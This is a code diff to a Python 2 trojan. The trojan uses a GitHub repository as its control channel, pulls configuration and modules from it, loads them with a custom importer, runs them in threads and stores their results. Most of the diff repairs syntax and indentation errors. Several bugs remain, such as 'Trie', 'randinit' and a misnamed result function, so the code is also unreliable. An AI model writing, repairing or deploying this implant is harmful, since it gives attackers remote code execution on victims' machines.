@@ -7,6 +7,7 @@ import random
 import threading
 import Queue
 import os
+import getpass 
 
 from github3 import login
 
@@ -18,11 +19,11 @@ trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
 user = raw_input("Username:")
-passw = raw_input("Password:")
-def connect_to_github()
+passw = getpass.getpass("Password:")
+def connect_to_github():
     gh = login(username=user,password=passw)
     repo = gh.repository("yourusername","chapter7")
-    repo.branch("master")
+    branch=repo.branch("master")
     return gh,repo,branch
 
 def get_file_contents(filepath):
@@ -30,9 +31,9 @@ def get_file_contents(filepath):
     tree = branch.commit.commit.tree.recurse()
     for filename in tree.tree:
         if filepath in filename.path:
-        print "[*] Found file %s" % filepath
-        blob = repo.blob(filename._json_data['sha'])
-        return blob.content
+            print "[*] Found file %s" % filepath
+            blob = repo.blob(filename._json_data['sha'])
+            return blob.content
     return None
 
 def get_trojan_config():
@@ -42,7 +43,7 @@ def get_trojan_config():
     configured = Trie
     for task in config:
         if task['module'] not in sys.modules:
-        exec("import %s" % task['module']}
+            exec("import %s" % task['module'])
     return config
 
 def store_module_results(data):
@@ -53,8 +54,8 @@ def store_module_results(data):
 
 
 class GitImporter(object):
-    def__init__(self):
-    self.current_module_code = " "
+    def __init__(self):
+        self.current_module_code = " "
     
     def find_module(self,fullname,path=None):
         if configured:
@@ -82,6 +83,8 @@ def module_runner(module):
     store_module_result(result)
     return
 
+
+
 sys.meta_path=[GitImporter()]
 
 while True:
@@ -89,7 +92,7 @@ while True:
     if task_queue.empty():
         config = get_trojan_config()
         for task in config:
-            t = threading.Thread(target=module_runner,args(task['module'],))
+            t = threading.Thread(target=module_runner,args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
     time.sleep(random.randinit(1000,10000))
